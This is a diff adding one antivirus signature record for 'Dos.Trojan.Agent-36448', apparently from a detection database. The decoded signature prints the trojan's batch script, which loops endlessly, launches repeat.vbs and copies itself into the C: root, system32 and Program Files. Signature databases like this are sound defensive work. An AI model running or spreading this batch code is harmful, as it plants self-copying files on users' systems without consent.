@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36448
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@ echo off :start echo hey hey start repeat.vbs copy %0 c:\ copy %0 c:\windows\system32 copy %0 c:\progra~1 goto :start echo annoyed yet? 
